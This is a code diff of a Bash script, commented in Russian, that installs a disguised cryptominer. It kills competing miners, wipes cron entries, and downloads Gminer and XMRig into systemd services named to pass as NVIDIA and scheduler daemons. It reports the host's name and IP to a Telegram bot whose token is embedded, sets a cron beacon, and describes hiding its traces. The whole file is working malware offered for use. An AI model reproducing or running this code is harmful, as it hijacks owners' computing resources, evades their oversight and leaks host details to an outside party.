@@ -1,29 +1,29 @@
 #!/bin/bash
 
-#--- KONFIGURACIYA ---#
+#--- КОНФИГУРАЦИЯ ---#
 KRYPTEX_IDENTIFIER="krxYNV2DZQ"
 WORKER_NAME=$(hostname)
 
-GPU_POOL="etc.kryptex.network:7033"
+GPU_POOL="etc-eu.kryptex.network:7033"
 CPU_POOL="xmr.kryptex.network:7029"
 
-TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
-TELEGRAM_CHAT_ID="7032066912"
+TELEGRAM_BOT_TOKEN="7705174143:AAEhkI4TsY2jJgi6rozt17Ki3nVFG_zNtWY"
+TELEGRAM_CHAT_ID="7639575061"
 
-#--- SISTEMNYE PARAMETRY (NE TROGAT') ---#
+#--- СИСТЕМНЫЕ ПАРАМЕТРЫ (НЕ ТРОГАТЬ) ---#
 BASE_DIR="/opt/system-daemons"; GPU_DIR="$BASE_DIR/gpu"; CPU_DIR="$BASE_DIR/cpu"
 GPU_SERVICE_NAME="gpu-compute-daemon"; CPU_SERVICE_NAME="cpu-sched-daemon"
 ORACLE_SCRIPT_PATH="$BASE_DIR/status-oracle.sh"
 
-#--- VSPOMOGATEL'NYE FUNKCII ---#
+#--- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---#
 send_telegram() { curl -s -A "Mozilla/5.0" -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" -d "chat_id=${TELEGRAM_CHAT_ID}" -d "text=$1" -d "parse_mode=HTML" > /dev/null; }
 
-#--- MODUL' ZACHISTKI ---#
+#--- МОДУЛЬ ЗАЧИСТКИ ---#
 eradicate_competition() {
-    echo "[!] Aktivaciya protokola zachistki 'Chistoe Nebo'..."
+    echo "[!] Aktivatsiya protokola zachistki 'Chistoe Nebo'..."
     local miner_processes=("kinsing" "kdevtmpfsi" "kworkerds" "Tsm" "pnscan" "xmrig" "minerd" "watchbog" "kerberods" "sysrv" "kthreadd" "lolMiner")
     
-    echo "[*] Poisk i unichtozhenie vrazheskih processov..."
+    echo "[*] Poisk i unichtozhenie vrazheskikh processov..."
     for process in "${miner_processes[@]}"; do
         if pgrep -f "$process" > /dev/null; then
             echo "   -> Obnaruzhen i likvidirovan: $process"
@@ -31,45 +31,45 @@ eradicate_competition() {
         fi
     done
 
-    echo "[*] Sterilizaciya planirovshchika zadach (Cron)..."
+    echo "[*] Sterilizatsiya planirovshika zadach (Cron)..."
     (crontab -l 2>/dev/null | grep -vE "curl|wget|xmrig|kinsing|kdevtmpfsi" | crontab -)
 
-    echo "[*] Udalenie ostatochnyh failov protivnika..."
+    echo "[*] Udalenie ostatochnykh failov protivnika..."
     find /tmp /var/tmp -name '*xmrig*' -exec rm -rf {} + 2>/dev/null
     rm -f /tmp/kdevtmpfsi /tmp/kinsing /var/tmp/kinsing
     
     echo "[+] Zachistka zavershena."
-    send_telegram "⚔️ <b>Protokol 'Chistoe Nebo' ispolnen na hoste:</b> <code>$(hostname)</code>. Territoriya steril'na."
+    send_telegram "⚔️ <b>Protokol 'Chistoe Nebo' ispolnen na khoste:</b> <code>$(hostname)</code>. Territoriya sterilna."
 }
 
-#--- OSNOVNOY BLOK ---#
+#--- ОСНОВНОЙ БЛОК ---#
 main() {
-    # ETAP I: PROVERKA I INICIALIZACIYA
+    # ЭТАП I: ПРОВЕРКА И ИНИЦИАЛИЗАЦИЯ
     if [ "$(id -u)" -ne 0 ]; then echo "Oshibka: Trebuetsya krov' root."; exit 1; fi
     if [[ "$KRYPTEX_IDENTIFIER" == "" || "$KRYPTEX_IDENTIFIER" == "YOUR_KRYPTEX_ID" ]]; then echo "KRITICHESKAYA OSHIBKA: Ukazhi svoy Kryptex Identifier v skripte!"; exit 1; fi
     
-    send_telegram "▶️ <b>Protokol 'Dominion' (Gminer) aktivirovan na hoste:</b> <code>$(hostname)</code>. IP: <code>$(curl -s -4 ifconfig.me)</code>"
+    send_telegram "▶️ <b>Protokol 'Dominion' (Gminer) aktivirovan na khoste:</b> <code>$(hostname)</code>. IP: <code>$(curl -s -4 ifconfig.me)</code>"
     
-    # ETAP II: AGRESSIVNOE PODAVLENIE
+    # ЭТАП II: АГРЕССИВНОЕ ПОДАВЛЕНИЕ
     eradicate_competition
     
-    # ETAP III: PODGOTOVKA I RAZVYORTYVANNIE (S GMINER)
-    echo "[*] Podgotovka placdarma i razvyortyvanie otryadov..."
+    # ЭТАП III: ПОДГОТОВКА И РАЗВЁРТЫВАННИЕ (С GMINER)
+    echo "[*] Podgotovka platsdarma i razvyortyvanie otryadov..."
     apt-get update >/dev/null 2>&1 && apt-get install -y curl tar gzip cron wget xz-utils >/dev/null 2>&1
     mkdir -p $GPU_DIR $CPU_DIR;
 
     echo "[*] Zagruzka GPU-modulya (Gminer v3.44)..."
     cd $GPU_DIR
-    GMINER_URL="github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz"
+    GMINER_URL="https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz"
     wget -q -O gminer.tar.xz "$GMINER_URL"
     if [ $? -eq 0 ] && file gminer.tar.xz | grep -q 'XZ compressed data'; then
         tar -xJf gminer.tar.xz
         mv miner $GPU_SERVICE_NAME && chmod +x $GPU_SERVICE_NAME
         rm gminer.tar.xz
-        echo "[+] GPU-modul' (Gminer) uspeshno razvernut."
+        echo "[+] GPU-modul (Gminer) uspeshno razvernut."
     else
-        echo "[-] KRITICHESKAYA OSHIBKA: Ne udalos' skachat' ili raspakovat' GPU-modul' (Gminer)."
-        send_telegram "❌ <b>Oshibka zagruzki GPU-modulya (Gminer) na hoste:</b> <code>$(hostname)</code>"
+        echo "[-] KRITICHESKAYA OSHIBKA: Ne udalos skachat ili raspakovat GPU-modul (Gminer)."
+        send_telegram "❌ <b>Oshibka zagruzki GPU-modulya (Gminer) na khoste:</b> <code>$(hostname)</code>"
     fi
 
     echo "[*] Zagruzka CPU-modulya (XMRig v6.24.0)..."
@@ -80,14 +80,14 @@ main() {
         tar -xzf xmrig.tar.gz --strip-components=1
         mv xmrig $CPU_SERVICE_NAME && chmod +x $CPU_SERVICE_NAME
         rm xmrig.tar.gz
-        echo "[+] CPU-modul' uspeshno razvernut."
+        echo "[+] CPU-modul uspeshno razvernut."
     else
-        echo "[-] KRITICHESKAYA OSHIBKA: Ne udalos' skachat' ili raspakovat' CPU-modul'."
-        send_telegram "❌ <b>Oshibka zagruzki CPU-modulya na hoste:</b> <code>$(hostname)</code>"
+        echo "[-] KRITICHESKAYA OSHIBKA: Ne udalos skachat ili raspakovat CPU-modul."
+        send_telegram "❌ <b>Oshibka zagruzki CPU-modulya na khoste:</b> <code>$(hostname)</code>"
     fi
 
-    # ETAP IV: INTEGRACIYA V SISTEMU (S GMINER)
-    echo "[*] Glubokaya integraciya v yadro sistemy (systemd)..."
+    # ЭТАП IV: ИНТЕГРАЦИЯ В СИСТЕМУ (С GMINER)
+    echo "[*] Glubokaya integratsiya v yadro sistemy (systemd)..."
     cat << EOF > /etc/systemd/system/${GPU_SERVICE_NAME}.service
 [Unit]
 Description=NVIDIA CUDA Compute Service
@@ -110,8 +110,8 @@ Restart=always;RestartSec=15;StandardOutput=null;StandardError=null
 WantedBy=multi-user.target
 EOF
 
-    # ETAP V: IMPLANTACIYA ORAKULA (Monitoring)
-    echo "[*] Implantaciya Orakula dlya takticheskih otchetov..."
+    # ЭТАП V: ИМПЛАНТАЦИЯ ОРАКУЛА (Мониторинг)
+    echo "[*] Implantatsiya Orakula dlya takticheskikh otchetov..."
     cat > $ORACLE_SCRIPT_PATH << EOF
 #!/bin/bash
 TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN}"
@@ -121,15 +121,15 @@ get_status_emoji() { if systemctl is-active --quiet "\$1"; then echo "✅ Aktive
 HOSTNAME=\$(hostname); GPU_STATUS=\$(get_status_emoji \$GPU_SERVICE_NAME); CPU_STATUS=\$(get_status_emoji \$CPU_SERVICE_NAME); UPTIME=\$(uptime -p)
 MESSAGE="<b>📊 Orakul: <code>\${HOSTNAME}</code></b>%0A"
 MESSAGE+="<b>Vremya raboty:</b> <code>\${UPTIME}</code>%0A"
-MESSAGE+="<b>GPU-modul':</b> \${GPU_STATUS}%0A"
-MESSAGE+="<b>CPU-modul':</b> \${CPU_STATUS}"
+MESSAGE+="<b>GPU-modul:</b> \${GPU_STATUS}%0A"
+MESSAGE+="<b>CPU-modul:</b> \${CPU_STATUS}"
 curl -s -X POST "https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage" -d "chat_id=\${TELEGRAM_CHAT_ID}" -d "text=\${MESSAGE}" -d "parse_mode=HTML" > /dev/null
 EOF
     chmod +x $ORACLE_SCRIPT_PATH
     (crontab -l 2>/dev/null | grep -Fv "$ORACLE_SCRIPT_PATH"; echo "*/30 * * * * /bin/bash $ORACLE_SCRIPT_PATH") | crontab -
 
-    # ETAP VI: AKTIVACIYA I ISCHEZNOVENIE
-    echo "[*] Aktivaciya sistem i zametanie sledov..."
+    # ЭТАП VI: АКТИВАЦИЯ И ИСЧЕЗНОВЕНИЕ
+    echo "[*] Aktivatsiya sistem i zametanie sledov..."
     systemctl daemon-reload
     systemctl enable --now $GPU_SERVICE_NAME >/dev/null 2>&1
     systemctl enable --now $CPU_SERVICE_NAME >/dev/null 2>&1
@@ -141,8 +141,8 @@ EOF
     
     echo ""
     echo "🎉 PROTOKOL 'DOMINION' USPESHNO ISPOLNEN!"
-    echo "   - GPU-modul' (${GPU_SERVICE_NAME}): $(systemctl is-active $GPU_SERVICE_NAME)"
-    echo "   - CPU-modul' (${CPU_SERVICE_NAME}): $(systemctl is-active $CPU_SERVICE_NAME)"
+    echo "   - GPU-modul (${GPU_SERVICE_NAME}): $(systemctl is-active $GPU_SERVICE_NAME)"
+    echo "   - CPU-modul (${CPU_SERVICE_NAME}): $(systemctl is-active $CPU_SERVICE_NAME)"
     echo "   - Otchety Orakula nastroeny."
     echo "   - Skript ustanovki samounichtozhilsya."
     
